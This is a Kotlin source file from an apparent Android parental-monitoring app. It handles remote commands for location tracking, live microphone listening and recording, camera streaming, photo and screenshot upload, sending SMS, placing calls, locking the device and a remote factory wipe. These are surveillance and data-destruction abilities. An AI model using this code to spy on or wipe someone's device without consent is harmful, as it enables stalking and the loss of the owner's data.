package com.kids.monitor.data

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCharacteristics
import android.media.AudioManager
import android.os.Build
import android.telephony.SmsManager
import androidx.core.content.ContextCompat
import com.kids.monitor.AdminReceiver
import com.kids.monitor.CameraService
import com.kids.monitor.MonitorService
import com.kids.monitor.NotificationRelayService
import com.kids.monitor.ScreenShareService

/** تنفيذ أوامر التحكم عن بُعد الواردة من لوحة التحكم. */
object CommandExecutor {

    fun execute(context: Context, type: String, payload: Map<String, Any>): Map<String, Any> {
        return try {
            when (type) {
                "get_location" -> getLocation(context)
                "ring" -> ring(context)
                "lock" -> lock(context)
                "clear_notifications" -> clearNotifications()
                "send_message" -> sendMessage(context, payload)
                "take_photo" -> takePhoto(context)
                "take_screenshot" -> takeScreenshot()
                "make_call" -> makeCall(context, payload)
                "mic_start" -> {
                    MonitorService.startMic(context)
                    ok("تم فتح المايك (استماع فقط)")
                }
                "mic_stop" -> {
                    MonitorService.stopMic()
                    ok("تم إيقاف المايك")
                }
                "record_mic" -> {
                    MonitorService.recordMic(context)
                    ok("جارٍ تسجيل مقطع صوتي…")
                }
                "camera_front_start" -> startCamera(context, CameraCharacteristics.LENS_FACING_FRONT)
                "camera_back_start" -> startCamera(context, CameraCharacteristics.LENS_FACING_BACK)
                "camera_stop" -> {
                    CameraService.stop(context)
                    ok("تم إيقاف الكاميرا")
                }
                "factory_reset" -> factoryReset(context)
                "sync_now" -> {
                    MonitorService.syncNow(context)
                    ok("تمت جدولة المزامنة الفورية")
                }
                else -> fail("أمر غير معروف")
            }
        } catch (e: Exception) {
            fail(e.localizedMessage ?: "خطأ غير معروف")
        }
    }

    private fun ok(message: String): Map<String, Any> = mapOf("ok" to true, "message" to message)

    private fun fail(message: String): Map<String, Any> = mapOf("ok" to false, "message" to message)

    private fun getLocation(context: Context): Map<String, Any> {
        if (!LocationCollector.hasPermission(context)) return fail("يتطلب صلاحية الموقع")
        val loc = LocationCollector.freshLocation(context) ?: LocationCollector.lastLocation(context)
            ?: return fail("تعذر الحصول على الموقع")
        if (DeviceInfo.online(context)) {
            FirestoreSync.writeLocation(context, loc)
        } else {
            val queued = loc.toMutableMap()
            queued["timestamp"] = System.currentTimeMillis()
            PendingStore.addMap(context, queued)
        }
        return ok("تم تحديث الموقع")
    }

    private fun ring(context: Context): Map<String, Any> {
        val audio = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audio.ringerMode = AudioManager.RINGER_MODE_NORMAL
        val max = audio.getStreamMaxVolume(AudioManager.STREAM_RING)
        audio.setStreamVolume(AudioManager.STREAM_RING, max, 0)
        return ok("تم تشغيل رنين الجهاز")
    }

    private fun lock(context: Context): Map<String, Any> {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) return fail("يتطلب تفعيل مسؤول الجهاز من شاشة الأذونات")
        dpm.lockNow()
        return ok("تم قفل الجهاز")
    }

    private fun clearNotifications(): Map<String, Any> {
        val service = NotificationRelayService.instance
        return if (service != null) {
            service.cancelAllNotifications()
            ok("تم مسح الإشعارات")
        } else {
            fail("خدمة قراءة الإشعارات غير مفعّلة")
        }
    }

    private fun sendMessage(context: Context, payload: Map<String, Any>): Map<String, Any> {
        val number = payload["number"]?.toString()?.trim().orEmpty()
        val message = payload["message"]?.toString().orEmpty()
        if (number.isBlank() || message.isBlank()) return fail("رقم المستلم أو نص الرسالة فارغ")
        if (!Permissions.has(context, Manifest.permission.SEND_SMS)) {
            return fail("يتطلب صلاحية إرسال الرسائل")
        }
        val sms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            context.getSystemService(SmsManager::class.java)
        } else {
            @Suppress("DEPRECATION")
            SmsManager.getDefault()
        } ?: return fail("خدمة الرسائل غير متاحة")
        sms.sendTextMessage(number, null, message, null, null)
        return ok("تم إرسال الرسالة")
    }

    private fun makeCall(context: Context, payload: Map<String, Any>): Map<String, Any> {
        val number = payload["number"]?.toString()?.trim().orEmpty()
        if (number.isBlank()) return fail("الرقم فارغ")
        if (!Permissions.has(context, Manifest.permission.CALL_PHONE)) {
            return fail("يتطلب صلاحية الاتصال الهاتفي")
        }
        val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:" + android.net.Uri.encode(number)))
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        return try {
            context.startActivity(intent)
            ok("تم بدء الاتصال")
        } catch (e: Exception) {
            fail("تعذر بدء الاتصال")
        }
    }

    private fun startCamera(context: Context, facing: Int): Map<String, Any> {
        if (!Permissions.has(context, Manifest.permission.CAMERA)) return fail("يتطلب صلاحية الكاميرا")
        CameraService.start(context, facing)
        return ok(if (facing == CameraCharacteristics.LENS_FACING_FRONT) "تشغيل الكاميرا الأمامية"
        else "تشغيل الكاميرا الخلفية")
    }

    private fun takePhoto(context: Context): Map<String, Any> {
        if (!Permissions.has(context, Manifest.permission.CAMERA)) return fail("يتطلب صلاحية الكاميرا")
        val file = CameraCapture.capture(context) ?: return fail("تعذر التقاط صورة")
        val url = StorageUploader.uploadSync(file, "photos/${file.name}")
        if (url == null) {
            file.delete()
            return fail("تم التقاط الصورة لكن تعذر رفعها")
        }
        FirestoreSync.appendItem(
            context,
            "media",
            mapOf(
                "name" to file.name,
                "url" to url,
                "type" to "image",
                "mimeType" to "image/jpeg",
                "size" to file.length(),
                "timestamp" to System.currentTimeMillis(),
            ),
        )
        return ok("تم التقاط صورة ورفعها")
    }

    /** لقطة شاشة فورية عبر خدمة مشاركة الشاشة النشطة. */
    private fun takeScreenshot(): Map<String, Any> {
        if (!ScreenShareService.isRunning()) {
            return fail("يتطلب تفعيل مشاركة الشاشة من التطبيق أولاً")
        }
        ScreenShareService.captureNow()
        return ok("تم التقاط لقطة شاشة ورفعها")
    }

    private fun factoryReset(context: Context): Map<String, Any> {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) return fail("يتطلب تفعيل مسؤول الجهاز من شاشة الأذونات")
        dpm.wipeData(0)
        return ok("تم إرسال طلب إعادة ضبط المصنع")
    }
}
